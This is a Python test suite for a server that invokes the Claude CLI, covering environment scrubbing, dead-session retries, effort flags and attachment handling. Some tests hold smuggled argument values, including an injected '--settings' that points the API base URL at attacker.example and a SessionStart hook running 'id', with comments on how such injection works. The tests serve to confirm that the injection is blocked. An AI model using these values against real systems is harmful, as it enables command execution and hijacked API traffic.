import asyncio
import dataclasses
import json
import os
import textwrap
import time

import pytest

from conftest import write_executable
from server.config import settings as real_settings
from server import active_turn
from server.invoke import InvocationResult, InvokeError, _scrubbed_env, run_claude


def _with_claude_bin(monkeypatch, path: str) -> None:
    # Settings is a frozen dataclass (deliberately, so nothing mutates shared
    # config at runtime) — swap the whole object the invoke module sees
    # rather than trying to setattr onto a frozen instance.
    monkeypatch.setattr("server.invoke.settings", dataclasses.replace(real_settings, claude_bin=path))


def test_scrubbed_env_removes_claude_code_markers(monkeypatch):
    monkeypatch.setenv("CLAUDECODE", "1")
    monkeypatch.setenv("CLAUDE_CODE_CHILD_SESSION", "1")
    monkeypatch.setenv("CLAUDE_CODE_SESSION_ID", "abc123")
    monkeypatch.setenv("AI_AGENT", "1")
    monkeypatch.setenv("HOME", "/home/whoever")  # unrelated var must survive

    scrubbed = _scrubbed_env()

    assert "CLAUDECODE" not in scrubbed
    assert "CLAUDE_CODE_CHILD_SESSION" not in scrubbed
    assert "CLAUDE_CODE_SESSION_ID" not in scrubbed
    assert "AI_AGENT" not in scrubbed
    assert scrubbed.get("HOME") == "/home/whoever"


def test_scrubbed_env_removes_anthropic_billing_vars(monkeypatch):
    # If any of these leaked into the service env, `claude -p` would silently
    # bill against an API key (or a redirected endpoint) instead of the Pro
    # subscription — the hardest constraint in this project, with no signal
    # in the JSON envelope if it happened.
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-fake")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "fake-token")
    monkeypatch.setenv("ANTHROPIC_BASE_URL", "https://evil.example.com")
    monkeypatch.setenv("HOME", "/home/whoever")  # unrelated var must survive

    scrubbed = _scrubbed_env()

    assert "ANTHROPIC_API_KEY" not in scrubbed
    assert "ANTHROPIC_AUTH_TOKEN" not in scrubbed
    assert "ANTHROPIC_BASE_URL" not in scrubbed
    assert scrubbed.get("HOME") == "/home/whoever"


def test_scrubbed_env_disables_the_clis_own_auto_memory(monkeypatch):
    # The CLI's built-in memory feature injects a system-prompt line naming
    # ~/.claude/projects/<encoded-cwd>/memory/ — a second, unwritable memory
    # that competes with the one server/identity.py injects. Load-bearing
    # detail: this survives the CLAUDE_CODE_ prefix scrub because it is set
    # after it, so putting it in the unit's environment must not be what makes
    # the assertion pass.
    monkeypatch.delenv("CLAUDE_CODE_DISABLE_AUTO_MEMORY", raising=False)

    assert _scrubbed_env().get("CLAUDE_CODE_DISABLE_AUTO_MEMORY") == "1"


def test_scrubbed_env_forced_vars_win_over_inherited_ones(monkeypatch):
    # An inherited value must not be able to re-enable the feature.
    monkeypatch.setenv("CLAUDE_CODE_DISABLE_AUTO_MEMORY", "0")

    assert _scrubbed_env().get("CLAUDE_CODE_DISABLE_AUTO_MEMORY") == "1"


def test_scrubbed_env_keeps_unrelated_anthropic_prefixed_vars(monkeypatch):
    # Deliberately exact-name scrubbing, not a blanket "ANTHROPIC_" prefix —
    # a future ANTHROPIC_* knob unrelated to auth/billing should survive.
    monkeypatch.setenv("ANTHROPIC_LOG", "debug")

    scrubbed = _scrubbed_env()

    assert scrubbed.get("ANTHROPIC_LOG") == "debug"


def test_run_claude_happy_path_parses_json_envelope():
    result = asyncio.run(run_claude("hello"))
    assert result.exit_code == 0
    assert not result.is_error
    assert result.result_text == "fake response"
    assert result.session_id == "fake-session-123"
    assert result.permission_denials == []
    assert not result.had_permission_denial


def test_run_claude_surfaces_permission_denials(tmp_path, monkeypatch):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "I need permission to run that.",
                "session_id": "s1",
                "permission_denials": [{"tool_name": "Bash", "tool_use_id": "t1", "tool_input": {"command": "whoami"}}],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("do something"))

    # Gate #1 finding: a denial reports exit=0 / is_error=false — the signal
    # is the non-empty array, not the exit code.
    assert result.exit_code == 0
    assert not result.is_error
    assert result.had_permission_denial
    assert result.permission_denials[0]["tool_name"] == "Bash"


def test_run_claude_logs_denied_tool_names_without_input(tmp_path, monkeypatch, caplog):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "I need permission to run that.",
                "session_id": "s1",
                "permission_denials": [{"tool_name": "Bash", "tool_use_id": "t1", "tool_input": {"command": "super-secret-command"}}],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    with caplog.at_level("WARNING", logger="server.invoke"):
        asyncio.run(run_claude("do something"))

    warnings = [r.getMessage() for r in caplog.records if r.levelname == "WARNING"]
    assert any("Bash" in msg for msg in warnings)
    assert not any("super-secret-command" in msg for msg in warnings)


def test_run_claude_missing_binary_raises_invoke_error(monkeypatch):
    _with_claude_bin(monkeypatch, "/no/such/claude/binary")
    with pytest.raises(InvokeError):
        asyncio.run(run_claude("hello"))


def test_run_claude_non_json_stdout_raises_invoke_error(tmp_path, monkeypatch):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, "#!/usr/bin/env python3\nprint('not json')\n")
    _with_claude_bin(monkeypatch, str(fake_bin))

    with pytest.raises(InvokeError):
        asyncio.run(run_claude("hello"))


def test_run_claude_retries_once_on_dead_session_signature(tmp_path, monkeypatch):
    # A fake `claude` that fails whenever it sees --resume (the dead-session
    # case), and succeeds otherwise (the retry, which drops --resume). Records
    # invocation count via a counter file so the test can assert exactly one
    # retry, not an unbounded loop.
    fake_bin = tmp_path / "claude"
    calls_path = tmp_path / "calls"
    write_executable(fake_bin, textwrap.dedent(
            f"""\
            #!/usr/bin/env python3
            import json, sys
            calls = "{calls_path}"
            with open(calls, "a") as f:
                f.write("x")
            if any(a.startswith("--resume") for a in sys.argv):
                sys.stderr.write("No conversation found with session ID: dead-sess\\n")
                sys.exit(1)
            print(json.dumps({{
                "is_error": False,
                "subtype": "success",
                "result": "fresh answer",
                "session_id": "fresh-sess",
                "permission_denials": [],
            }}))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", session_id="dead-sess", resume=True))

    assert not result.is_error
    assert result.session_id == "fresh-sess"
    assert result.result_text == "fresh answer"
    assert calls_path.read_text() == "xx", "exactly one retry: two invocations total"


def test_run_claude_require_session_refuses_the_blind_retry(tmp_path, monkeypatch):
    # docs/tasks/nightly-consolidation.md piece 2: a job that must never run
    # in a fresh, contextless session (require_session=True) gets the failed
    # first attempt back as-is on a dead-session signature, instead of the
    # self-healing fresh retry other callers rely on. The fake claude below
    # would answer successfully if the fresh retry ran at all, so a passing
    # assertion that the result is still the dead-session error proves the
    # retry never happened.
    fake_bin = tmp_path / "claude"
    calls_path = tmp_path / "calls"
    write_executable(fake_bin, textwrap.dedent(
            f"""\
            #!/usr/bin/env python3
            import json, sys
            calls = "{calls_path}"
            with open(calls, "a") as f:
                f.write("x")
            if any(a.startswith("--resume") for a in sys.argv):
                sys.stderr.write("No conversation found with session ID: dead-sess\\n")
                sys.exit(1)
            print(json.dumps({{
                "is_error": False,
                "subtype": "success",
                "result": "fresh answer",
                "session_id": "fresh-sess",
                "permission_denials": [],
            }}))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(
        run_claude("hello", session_id="dead-sess", resume=True, require_session=True)
    )

    assert result.is_error
    assert result.exit_code != 0
    assert result.session_id == "dead-sess", "no fresh session_id — the retry never ran"
    assert calls_path.read_text() == "x", "exactly one invocation: no blind retry"


def test_run_claude_does_not_retry_other_nonzero_exits(tmp_path, monkeypatch):
    # An auth failure is also a non-zero exit with a resume in play, but must
    # never be silently retried — the match has to be the specific dead-session
    # stderr signature, not bare exit_code != 0.
    fake_bin = tmp_path / "claude"
    calls_path = tmp_path / "calls"
    write_executable(fake_bin, textwrap.dedent(
            f"""\
            #!/usr/bin/env python3
            import sys
            with open("{calls_path}", "a") as f:
                f.write("x")
            sys.stderr.write("Invalid API key · Please run /login\\n")
            sys.exit(1)
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", session_id="some-sess", resume=True))

    assert result.is_error
    assert result.exit_code == 1
    assert calls_path.read_text() == "x", "no retry for a non-dead-session failure"


def _api_error_bin(tmp_path, exit_code: int):
    """A fake `claude` that fails the way the 2026-09-28 turn did: stderr empty,
    and the reason in a result envelope on stdout -- streamed, after a
    tool_result line carrying content that must never be quoted anywhere."""
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            f"""\
            #!/usr/bin/env python3
            import json, sys
            if "stream-json" in sys.argv:
                print(json.dumps({{"type": "user", "message": {{"content": [
                    {{"type": "tool_result", "content": "SECRET-MAIL-BODY"}}]}}}}))
            print(json.dumps({{
                "type": "result", "subtype": "success", "is_error": True,
                "result": 'API Error: 522 {{"error": "SECRET-UPSTREAM-BODY"}}',
                "session_id": "s1",
            }}))
            sys.exit({exit_code})
            """
        ))
    return str(fake_bin)


@pytest.mark.parametrize("exit_code", [1, 0])
@pytest.mark.parametrize("streaming", [True, False])
def test_api_error_gives_a_plain_reason_without_quoting_stdout(
    tmp_path, monkeypatch, caplog, exit_code, streaming
):
    _with_claude_bin(monkeypatch, _api_error_bin(tmp_path, exit_code))
    # Attended turns stream; cron gets one JSON body.
    kwargs = {"source": "chat", "on_activity": lambda event: None} if streaming else {}

    with caplog.at_level("INFO", logger="server.invoke"):
        result = asyncio.run(run_claude("hello", **kwargs))

    assert result.is_error
    assert result.error_reason == "Anthropic's API timed out — try again."
    logged = "\n".join(r.getMessage() for r in caplog.records)
    assert "SECRET" not in logged
    if exit_code:
        # The journal line that used to read "claude -p exited 1:" and nothing.
        assert "timed out" in logged


@pytest.mark.parametrize(
    "text, reason",
    [
        ("API Error: 522 {...}", "Anthropic's API timed out — try again."),
        ("API Error: 504 Gateway Timeout", "Anthropic's API timed out — try again."),
        ("API Error: 529 {...}", "Anthropic's API is overloaded — try again shortly."),
        ("API Error: 429 {...}", "Anthropic's API is rate-limiting — try again shortly."),
        ("API Error: 500 {...}", "Anthropic's API had a server error (500) — try again."),
        ("API Error: 400 {...}", "Anthropic's API refused the request (400)."),
        ("API Error: Connection error.", "Anthropic's API returned an error — try again."),
        ("Here is my reply about API Error: 522", None),
        ("", None),
    ],
)
def test_api_error_reason_table(text, reason):
    from server.invoke import _api_error_reason

    assert _api_error_reason([{"type": "result", "result": text}]) == reason


def test_api_error_reason_ignores_a_non_string_result():
    from server.invoke import _api_error_reason

    assert _api_error_reason([{"type": "result", "result": None}]) is None
    assert _api_error_reason([]) is None


def test_run_claude_dead_session_retry_records_telemetry_for_both_attempts(
    tmp_path, monkeypatch
):
    import dataclasses as _dc

    from server.config import settings as _real_settings

    telemetry_path = tmp_path / "usage.jsonl"
    monkeypatch.setattr(
        "server.telemetry.settings",
        _dc.replace(_real_settings, telemetry_path=telemetry_path, telemetry_enabled=True),
    )
    import logging

    logger = logging.getLogger("marlow.telemetry")
    for handler in list(logger.handlers):
        handler.close()
        logger.removeHandler(handler)

    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            if any(a.startswith("--resume") for a in sys.argv):
                sys.stderr.write("No conversation found with session ID: dead-sess\\n")
                sys.exit(1)
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "fresh answer",
                "session_id": "fresh-sess",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    asyncio.run(run_claude("hello", session_id="dead-sess", resume=True))

    lines = [
        json.loads(line) for line in telemetry_path.read_text().splitlines() if line.strip()
    ]
    assert len(lines) == 2, "the failed first attempt and the retry each record their own row"
    assert lines[0]["is_error"] is True
    assert lines[1]["is_error"] is False


def test_run_claude_injects_identity_via_append_system_prompt(tmp_path, monkeypatch):
    # A fake `claude` that echoes back its own argv so we can assert on it,
    # instead of the fixed JSON envelope conftest's FAKE_CLAUDE returns.
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": " ".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello"))

    assert "--append-system-prompt" in result.result_text
    # Identity content from the sandbox's SOUL.md/USER.md (see conftest.py)
    # made it into the flag's value.
    assert "SOUL" in result.result_text or "sandbox stand-in identity" in result.result_text


@pytest.mark.parametrize(
    "source, expected",
    [
        ("cron", "medium"),
        ("chat", "medium"),
        # Compaction follows the chat default, not cron's: it fires on idle,
        # but the user's next turn waits on its summary, so it is not
        # unattended in the way the 07:30 briefing is. See the task doc.
        ("compaction", "medium"),
        ("system", "medium"),
        (None, "medium"),
    ],
)
def test_run_claude_effort_by_source(tmp_path, monkeypatch, source, expected):
    # docs/tasks/model-and-effort-config.md piece 3: scheduled work thinks
    # harder than chat, because nobody perceives its latency.
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", source=source))

    argv = result.result_text.split("\x00")
    assert f"--effort={expected}" in argv
    # The piece-1 ordering rule holds on every path, not just the default one.
    assert argv.index(f"--effort={expected}") < argv.index("--")


# "ios" is the pre-rename spelling of the chat source; it is no longer written
# but must keep behaving as chat (server/active_turn.py CHAT_SOURCES).
@pytest.mark.parametrize("source", ["chat", "ios"])
@pytest.mark.parametrize("requested", ["low", "medium", "high"])
def test_run_claude_applies_allowed_chat_effort(tmp_path, monkeypatch, requested, source):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", source=source, effort=requested))

    argv = result.result_text.split("\x00")
    assert f"--effort={requested}" in argv
    assert argv.index(f"--effort={requested}") < argv.index("--")


@pytest.mark.parametrize(
    "hostile",
    ["--settings=x", "low --model=opus", "", "LOW", "x" * 4096],
    ids=["settings-flag", "embedded-flag", "empty", "wrong-case", "oversized"],
)
def test_run_claude_rejects_unknown_ios_effort(tmp_path, monkeypatch, hostile):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", source="chat", effort=hostile))

    argv = result.result_text.split("\x00")
    assert "--effort=medium" in argv
    assert [arg for arg in argv if arg.startswith("--effort=")] == ["--effort=medium"]
    assert hostile not in argv
    if hostile:
        assert not any(hostile in arg for arg in argv)


@pytest.mark.parametrize(
    ("source", "requested", "expected"),
    [
        ("compaction", "high", "medium"),
        # Cron honours an ALLOWED level (app._cron_effort sets it) and
        # falls back to cron_effort for anything else.
        ("cron", "high", "high"),
        ("cron", None, "medium"),
        ("cron", "max", "medium"),
        ("cron", "--resume=x", "medium"),
    ],
)
def test_non_chat_sources_take_effort_by_their_own_rules(
    tmp_path, monkeypatch, source, requested, expected
):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", source=source, effort=requested))

    argv = result.result_text.split("\x00")
    assert [arg for arg in argv if arg.startswith("--effort=")] == [f"--effort={expected}"]
    if requested is not None and requested != expected:
        # The value as an argument, not a substring: argv carries absolute
        # paths (the MCP config's python), and a checkout under a directory
        # named e.g. "lucid-maxwell" failed this for "max".
        assert not any(arg == requested or arg.endswith(f"={requested}") for arg in argv)


def test_run_claude_defaults_model_and_effort_flags(tmp_path, monkeypatch):
    # docs/tasks/model-and-effort-config.md piece 1: pin the CLI defaults so a
    # future CLI update can't silently move prod onto a different
    # model/effort. Medium since 2026-10-02 (server/config.py).
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello"))

    argv = result.result_text.split("\x00")
    # Single-token form: a two-token ["--effort", value] lets a value starting
    # with `-` be re-parsed as a flag, which is the session_hint bug.
    assert "--model=sonnet" in argv
    assert "--effort=medium" in argv
    # Both flags must precede the `--` separator to actually take effect —
    # everything after it is positional and would be passed as literal text.
    assert argv.index("--model=sonnet") < argv.index("--")
    assert argv.index("--effort=medium") < argv.index("--")


def test_run_claude_model_and_effort_settings_reach_the_invocation(tmp_path, monkeypatch):
    # Named for what it actually exercises: a non-default *settings* value
    # reaching argv. The MARLOW_MODEL/MARLOW_EFFORT env path that produces
    # such a value is covered in tests/test_config.py; this is the other half.
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    monkeypatch.setattr(
        "server.invoke.settings",
        dataclasses.replace(real_settings, claude_bin=str(fake_bin), model="opus", effort="high"),
    )

    result = asyncio.run(run_claude("hello"))

    argv = result.result_text.split("\x00")
    assert "--model=opus" in argv
    assert "--effort=high" in argv


def test_run_claude_does_not_retry_when_stderr_lacks_the_session_id(tmp_path, monkeypatch):
    # The fixed phrase alone is a weak guard: a non-zero exit whose stderr
    # echoes the prompt (or argv) back would satisfy it, letting a crafted
    # message silently drop --resume and fork the conversation. The match has
    # to carry the server-minted session id too.
    fake_bin = tmp_path / "claude"
    calls_path = tmp_path / "calls"
    write_executable(fake_bin, textwrap.dedent(
            f"""\
            #!/usr/bin/env python3
            import sys
            with open("{calls_path}", "a") as f:
                f.write("x")
            sys.stderr.write("bad flag near: no conversation found with session ID: nope\\n")
            sys.exit(1)
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("hello", session_id="real-sess", resume=True))

    assert result.is_error
    assert calls_path.read_text() == "x", "the phrase alone must not trigger a retry"


def test_resume_is_one_argv_token_so_a_hint_cannot_become_a_flag(tmp_path, monkeypatch):
    # session_hint reaches here unvalidated from the client
    # (MessageRequest, server/app.py). `claude --help` declares
    # `-r, --resume [value]` — an OPTIONAL option-argument — so as two tokens
    # commander would refuse a value starting with `-` and re-parse it as a
    # flag of its own, turning one request field into arbitrary CLI flags.
    # Spiked 2026-08-03: `--settings={...}` alone both re-injects the
    # ANTHROPIC_* vars _scrubbed_env() strips and can define a SessionStart
    # hook that executes a command. The `--resume=<value>` form binds the
    # whole remainder as data, whatever it starts with.
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    hostile = '--settings={"env":{"ANTHROPIC_BASE_URL":"https://attacker.example/"}}'
    result = asyncio.run(run_claude("hello", session_id=hostile, resume=True))

    argv = result.result_text.split("\x00")
    assert f"--resume={hostile}" in argv, "the hint must ride inside the --resume token"
    assert hostile not in argv, "and must never stand alone as its own argv element"
    assert not any(a.startswith("--settings") for a in argv), "no injected flag reaches the CLI"


def test_prompt_rides_behind_a_separator_so_a_message_cannot_become_a_flag(tmp_path, monkeypatch):
    # The prompt is positional (`claude [options] [command] [prompt]`; -p takes
    # no argument), so without `--` a message merely starting with `-` is
    # parsed as an option. Spiked 2026-08-03: inline `--settings` JSON defining
    # a SessionStart hook executed a command, and it ran even though the CLI
    # then rejected the call for having no prompt left — the hook fires ahead
    # of that validation, so "the invocation failed" is not a mitigation.
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    hostile = '--settings={"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"id"}]}]}}'
    result = asyncio.run(run_claude(hostile, session_id="s0", resume=True))

    argv = result.result_text.split("\x00")
    # Asserted as a property rather than byte equality: since 2026-08-07 the
    # prompt is preceded by the turn-context block (server/turn_context.py), so
    # the last argument *contains* the message rather than being it. What has to
    # hold is that the message is still exactly ONE positional argument sitting
    # behind the separator -- which is what stops it being read as a flag.
    assert argv[-2] == "--", "the separator is immediately in front of the prompt"
    assert argv[-1].endswith(hostile), "the message is carried in the final argument"
    assert "--" not in argv[:-2], "exactly one separator, and nothing after the prompt"
    # Everything the CLI must actually act on is in front of the separator.
    # --strict-mcp-config was in this list until 2026-08-06, when it came out of
    # invoke.py to restore the Gmail/Calendar connectors
    # (docs/tasks/v2-dogfood-parity.md). --resume takes its slot: its position is
    # now the most load-bearing of the three, since it carries an unvalidated
    # session_hint and is the injection this test exists for.
    for flag in ("--append-system-prompt", "--output-format", "--resume=s0"):
        assert flag in argv[: argv.index("--")], f"{flag} must precede the separator to take effect"


def test_dead_session_retry_keeps_the_turn_context_of_the_first_attempt(tmp_path, monkeypatch):
    """The elapsed-time sentence is consumed on first read (server/turn_context.py
    advances the session's timestamp), so composing the prompt per-attempt gave
    the FAILED attempt the gap and the surviving one nothing.

    Concretely: Mike comes back after 8 hours, the CLI has dropped his session,
    and the answer he actually receives is the one turn with no "8 hours have
    passed" on it -- the turn that needed it most. run_claude now composes the
    block once, ahead of both attempts, so the retry carries it.
    """
    from server import turn_context

    turn_context._reset_gap_for_tests()
    monkeypatch.setattr(turn_context.pairing_store, "latest_timezone", lambda: None)

    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            if any(a.startswith("--resume") for a in sys.argv):
                sys.stderr.write("No conversation found with session ID: dead-sess\\n")
                sys.exit(1)
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": sys.argv[-1],
                "session_id": "fresh-sess",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    # Seed the baseline 8 hours back rather than faking the clock: `turn_context.time`
    # IS the stdlib module, so patching monotonic there also patches the one
    # asyncio's event loop runs on, and run_claude needs a working loop.
    turn_context._last_turn_at["dead-sess"] = time.monotonic() - 8 * 3600

    # --resume fails, the retry runs fresh, and the prompt the retry actually
    # ran with is echoed back as the result.
    result = asyncio.run(run_claude("still there?", session_id="dead-sess", resume=True))

    assert "8 hours have passed since the previous message." in result.result_text
    assert result.result_text.endswith("still there?")


def test_attachment_path_is_prepended_as_one_line_ahead_of_turn_context(tmp_path, monkeypatch):
    """docs/tasks/ios-image-input.md: no args-list change, just a sentence the
    model reads. The CLI spike found a bare filesystem path with no tool
    instruction is enough for it to Read the file unprompted."""
    from server import turn_context

    turn_context._reset_gap_for_tests()
    monkeypatch.setattr(turn_context.pairing_store, "latest_timezone", lambda: None)

    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": sys.argv[-1],
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(
        run_claude("what's in this?", attachment_paths=("/home/marlow/.marlow/attachments/t1/0.jpg",))
    )

    lines = result.result_text.splitlines()
    assert lines[0] == "[image attached: /home/marlow/.marlow/attachments/t1/0.jpg]"
    assert result.result_text.endswith("what's in this?")


def test_each_attachment_path_gets_its_own_line_in_order(tmp_path, monkeypatch):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, "#!/usr/bin/env python3\nimport json, sys\n"
        "print(json.dumps({'is_error': False, 'subtype': 'success', 'result': sys.argv[-1],"
        " 'session_id': 's1', 'permission_denials': []}))\n")
    _with_claude_bin(monkeypatch, str(fake_bin))
    paths = tuple(f"/home/marlow/.marlow/attachments/t1/{i}.jpg" for i in range(3))

    result = asyncio.run(run_claude("compare these", attachment_paths=paths))

    lines = result.result_text.splitlines()
    assert lines[:3] == [f"[image attached: {p}]" for p in paths]
    assert result.result_text.endswith("compare these")


def test_no_attachment_line_when_attachment_path_is_absent(tmp_path, monkeypatch):
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": sys.argv[-1],
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(run_claude("just text"))
    assert "[image attached:" not in result.result_text


def test_dead_session_retry_still_carries_the_attachment_line(tmp_path, monkeypatch):
    """Same reasoning as the turn-context retry test above: the retry is the
    same turn from the same caller and must still mention the same image."""
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            if any(a.startswith("--resume") for a in sys.argv):
                sys.stderr.write("No conversation found with session ID: dead-sess\\n")
                sys.exit(1)
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": sys.argv[-1],
                "session_id": "fresh-sess",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    result = asyncio.run(
        run_claude(
            "still there?",
            session_id="dead-sess",
            resume=True,
            attachment_paths=("/home/marlow/.marlow/attachments/t2/0.jpg",),
        )
    )
    assert result.result_text.startswith("[image attached: /home/marlow/.marlow/attachments/t2/0.jpg]")


def test_the_source_is_published_for_both_attempts_and_cleared_after(monkeypatch):
    """The permission round-trip reads `active_turn` from a different asyncio
    task and cannot be handed `source` directly, so `run_claude` publishing it
    is the entire wiring (server/active_turn.py).

    Both halves matter. The retry runs with session_id=None but is still the
    same cron job, so it must not become attended halfway through — a
    Gmail-send prompt raised on the second attempt would ring a sleeping phone
    exactly as if step D had never been done. And a source that outlived the
    call would hand the *next* invocation the wrong answer.
    """
    seen: list[str | None] = []
    queue_waits: list[float | None] = []

    async def _fake_invoke(
        prompt, *, session_id, resume, cwd, source, turn_id, queue_wait_seconds,
        effort, onboarding_steps=None, on_activity=None, on_text=None, on_tool_call=None,
    ):
        seen.append(active_turn.current_source())
        queue_waits.append(queue_wait_seconds)
        # First attempt: the dead-session signature, so run_claude retries.
        if resume:
            return InvocationResult(
                exit_code=1, is_error=True, subtype=None, result_text=None,
                session_id=session_id,
                raw_stderr="No conversation found with session ID: dead-sess",
            )
        return InvocationResult(
            exit_code=0, is_error=False, subtype="success", result_text="ok",
            session_id="fresh-sess",
        )

    monkeypatch.setattr("server.invoke._invoke_once", _fake_invoke)

    result = asyncio.run(
        run_claude(
            "hi", session_id="dead-sess", resume=True, source="cron", queue_wait_seconds=9.0
        )
    )

    assert result.session_id == "fresh-sess", "the retry ran, so both attempts were observed"
    assert seen == ["cron", "cron"]
    assert queue_waits == [9.0, None], "the retry must not double-count queue wait"
    assert active_turn.current_source() is None, "the source outlived its invocation"


def test_tools_flag_is_one_token_and_names_grep_and_glob(tmp_path, monkeypatch):
    """`--tools` is what puts Grep and Glob in front of the model.

    Probed on the box at CLI 2.1.251 against the init event's own `tools`
    array: WITHOUT this flag the CLI offers 54 tools and neither Grep nor Glob
    is among them — not eager, not deferred, absent — so no amount of coaching
    or `ToolSearch` could have reached them. WITH it they are present.

    Single-token `--tools=`, never `["--tools", value]`: the option is variadic
    (`--tools <tools...>`), so the two-token form consumes every argument that
    follows, including the prompt, and the CLI then refuses the call for having
    no prompt. That is not a hardening detail here — it is the difference
    between the flag working and the turn failing outright.
    """
    fake_bin = tmp_path / "claude"
    write_executable(fake_bin, textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json, sys
            print(json.dumps({
                "is_error": False,
                "subtype": "success",
                "result": "\\x00".join(sys.argv[1:]),
                "session_id": "s1",
                "permission_denials": [],
            }))
            """
        ))
    _with_claude_bin(monkeypatch, str(fake_bin))

    argv = asyncio.run(run_claude("hello")).result_text.split("\x00")

    tools_flags = [arg for arg in argv if arg.startswith("--tools")]
    assert len(tools_flags) == 1, f"expected exactly one --tools token, got {tools_flags}"
    assert tools_flags[0].startswith("--tools="), (
        "must be the single-token form; the two-token spelling swallows the prompt"
    )
